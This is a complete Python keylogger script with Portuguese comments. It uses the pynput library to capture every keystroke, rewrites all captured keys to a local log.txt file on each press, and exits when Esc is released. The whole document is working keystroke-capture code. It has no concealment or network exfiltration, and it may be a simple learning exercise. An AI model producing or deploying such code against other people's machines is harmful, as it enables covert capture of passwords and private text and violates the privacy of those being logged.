import pynput
from pynput.keyboard import Key, Listener

# Lista de teclas pressionadas
keys = []

# Função que adiciona a tecla pressionada à lista de teclas e chama a função para escrever essa tecla num ficheiro txt
def on_press(key):
  keys.append(key)
  write_file(keys)

# Função para escrever a tecla pressionada no ficheiro txt
def write_file(keys):
  with open('log.txt', 'w') as f:
    for key in keys:
      # Remove '' após a conversão da tecla para o "nome" da tecla
      k = str(key).replace("'", "") 
      f.write(k)
      # Adiciona um espaço em branco entre as teclas escritas para facilitar escrita
      f.write(' ') 

# Função que verifica se a tecla "esc" foi pressionada e caso tenha sido termina o programa
def on_release(key):
  if key == Key.esc:
    return False

# É criado um objeto Listener para tratar de eventos de clicar e largar uma tecla 
with Listener(on_press = on_press, on_release = on_release) as listener:
  listener.join()